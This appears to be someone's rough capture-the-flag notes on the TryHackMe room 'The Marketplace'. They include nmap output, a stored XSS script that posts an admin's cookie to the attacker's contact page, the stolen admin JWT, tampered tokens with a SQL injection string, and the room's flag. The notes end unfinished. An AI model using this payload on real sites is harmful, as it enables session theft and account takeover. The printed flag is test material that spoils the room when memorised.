# Tryhackme.com Room : The Marketplace
`https://tryhackme.com/room/dogcat`


# Instance
```
export IP=10.10.186.151
```

# Nmap
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
MAC Address: 02:3B:E6:C1:06:4B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is a webapp running on port `32768` that is proxy through nginx on port 80

The website is a 

```
http://10.10.186.151:32768/http-robots.txt
```

There is 2 listing on the website from
```
jake
michael
```

Created a dummy user account
```
yolo:fatkid
```


Sus :
    - report listing to admins
        - Might be an xss where the admin will visit the page and we can retrieve it's cookie using javascript somehow
    - The "new listing" tab has the file upload button disabled.
        - We can enable it by modifying the html but 


XSS

We set `new listing` description to
```
<script>
document.body.innerHTML += '<form id="exploit" action="/contact/yolo" method="post"><input type="hidden" name="message" value="' + document.cookie + '"></form>';
document.getElementById("exploit").submit();
</script>
```

Then we report the page.

We receive a message from admin (`michael`) with its token
```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDMwNjEyNTR9.76O0N69K5Iw5sQooF7Jlh4jc_OeHoA74TwDfOuIz-uc
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjksInVzZXJuYW1lIjoiJzsgc2VsZWN0ICogZnJvbSB1c2VyczsiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTYwMzA2MzQyNn0.M9R166gdQVeMYoiDjNcvUNEPuEuMIOM38Y3WMe6oohg
```


eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjksInVzZXJuYW1lIjoiJzsgc2VsZWN0ICogZnJvbSB1c2VyczsiLCJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjAzMDYzNDI2fQ==.M9R166gdQVeMYoiDjNcvUNEPuEuMIOM38Y3WMe6oohg

We get access to an admin pannel with the following flag :
```
THM{c37a63895910e478f28669b048c348d5}
```

We have a listing of all the users but there doesn't seems to be anything we can do from there...

The delete user button doesn't do anything

We can't find a place where an sql injection work